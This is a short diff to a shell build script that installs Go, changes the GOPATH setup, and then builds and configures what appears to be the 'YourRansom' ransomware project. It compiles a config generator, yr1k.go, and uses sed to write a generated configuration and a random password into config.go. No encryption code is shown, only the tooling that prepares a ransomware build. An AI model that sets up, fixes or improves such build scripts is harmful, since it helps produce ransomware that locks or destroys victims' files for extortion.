@@ -18,9 +18,11 @@ if [[ $? -ne 2 ]]; then
     esac
     tar -C /usr/local -xzf golang.tar.gz
     echo "export PATH=$PATH:/usr/local/go/bin" >> ~/.bashrc
-    echo "export GOPATH=$HOME/go" >> ~/.bashrc
-    mkdir $HOME/go
-    source ~/.bashrc
+    echo "export GOPATH=$HOME/go-workspace" >> ~/.bashrc
+    mkdir -p $HOME/go-workspace
+    . ~/.bashrc
+    export PATH=$PATH:/usr/local/go/bin
+    export GOPATH=$HOME/go-workspace
 fi
 
 
@@ -35,7 +37,7 @@ go build yr1k.go -o config.o
 chmod a+x config.o
 config=$(./config.o ${rand_str})
 
-cd $HOME/go/src/github.com/YourRansom/YourRansom
+cd ${GOPATH}/src/github.com/YourRansom/YourRansom
 sed -i "s/YOUR_CONFIG/${config}/" config.go
 sed -i "s/YOUR_PW/${rand_str}/" config.go
 
